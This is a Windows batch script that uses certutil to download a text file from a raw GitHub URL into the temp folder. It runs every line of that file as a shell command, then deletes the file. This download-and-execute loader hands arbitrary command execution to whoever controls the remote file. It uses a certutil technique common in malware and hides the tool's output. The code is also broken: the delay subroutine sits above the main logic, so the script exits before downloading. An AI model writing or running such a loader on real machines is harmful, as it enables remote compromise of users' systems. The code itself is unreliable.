@echo off
SET "url=https://raw.githubusercontent.com/Zombro01/blob.../refs/heads/main/nrblx.txt"
SET "tempFile=%TEMP%\nrblx_commands.txt"

:: Function to add a 20-millisecond delay
:delay
ping localhost -n 1 -w 20 >nul
GOTO :eof

echo Downloading command file from %url%...
:: Delay before downloading
call :delay
:: Download the .txt file from the URL
certutil -urlcache -split -f "%url%" "%tempFile%" >nul 2>&1

:: Delay after download
call :delay
:: Check if the file was downloaded successfully
IF EXIST "%tempFile%" (
    echo Download successful. Executing commands from the .txt file...

    :: Read and execute each line from the downloaded .txt file
    for /f "usebackq delims=" %%A in ("%tempFile%") do (
        call :delay
        echo Running: %%A
        %%A
    )

    :: Clean up the temporary file
    call :delay
    del "%tempFile%" >nul
) ELSE (
    echo Failed to download the script. Please check your internet connection.
)

:: Delay before the pause at the end
call :delay
pause
